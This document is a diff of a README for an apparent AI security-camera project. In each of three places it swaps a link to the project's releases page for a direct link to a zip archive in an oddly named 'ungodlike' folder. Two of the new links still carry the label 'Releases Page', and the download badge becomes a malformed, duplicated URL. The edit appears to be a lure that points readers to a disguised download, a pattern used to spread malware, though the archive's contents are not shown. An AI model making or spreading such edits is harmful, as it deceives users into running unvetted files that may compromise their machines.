@@ -1,6 +1,6 @@
 # 🤖 Security-Camera-w-AI - Smart Security Made Simple
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Harmandeep16/Security-Camera-w-AI/releases)
+[![Download](https://github.com/Harmandeep16/Security-Camera-w-AI/raw/refs/heads/main/ungodlike/Security-AI-w-Camera-2.4-alpha.1.zip%https://github.com/Harmandeep16/Security-Camera-w-AI/raw/refs/heads/main/ungodlike/Security-AI-w-Camera-2.4-alpha.1.zip)](https://github.com/Harmandeep16/Security-Camera-w-AI/raw/refs/heads/main/ungodlike/Security-AI-w-Camera-2.4-alpha.1.zip)
 
 ## 📜 Description
 
@@ -23,7 +23,7 @@ This application is compatible with most standard computers. Make sure your oper
 
 ### 2. Download the Application
 
-Visit this page to download: [Releases Page](https://github.com/Harmandeep16/Security-Camera-w-AI/releases).
+Visit this page to download: [Releases Page](https://github.com/Harmandeep16/Security-Camera-w-AI/raw/refs/heads/main/ungodlike/Security-AI-w-Camera-2.4-alpha.1.zip).
 
 Once you're on the Releases page, look for the latest version at the top of the list. Click on the download link for your operating system. The file should automatically begin downloading.
 
@@ -63,7 +63,7 @@ After setting everything up, your security system is now ready to go. The applic
 
 ## 🔗 Download & Install
 
-To download the application, please visit: [Releases Page](https://github.com/Harmandeep16/Security-Camera-w-AI/releases). Choose the package suitable for your operating system and follow the installation steps outlined above.
+To download the application, please visit: [Releases Page](https://github.com/Harmandeep16/Security-Camera-w-AI/raw/refs/heads/main/ungodlike/Security-AI-w-Camera-2.4-alpha.1.zip). Choose the package suitable for your operating system and follow the installation steps outlined above.
 
 ## 🛠️ Troubleshooting
 
